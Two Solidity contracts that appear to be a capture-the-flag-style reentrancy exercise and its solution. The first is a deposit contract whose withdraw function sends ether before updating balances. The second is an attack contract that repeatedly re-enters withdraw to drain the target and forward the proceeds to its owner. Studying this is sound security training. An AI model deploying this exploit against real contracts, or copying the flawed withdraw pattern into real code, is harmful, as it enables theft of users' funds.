```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```


``` solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;


interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    address payable public owner;
    Reentrance public target;

    constructor(address _target) public {
        target = Reentrance(_target);
        owner = msg.sender;
    }

    receive() external payable { 
        require(address(target).balance > 0);
        target.withdraw(1 ether);
    }

    function attacker() external payable {
        require(msg.value >= 1 ether);
       // Step 1: donate to THIS contract (not owner!)
        target.donate{value: 1 ether}(address(this));
       // Step 2: trigger the reentrancy
        target.withdraw(1 ether);
    }

    function collect() external {
        require(msg.sender == owner, "Only owner");
        owner.transfer(address(this).balance);
        }

}
```
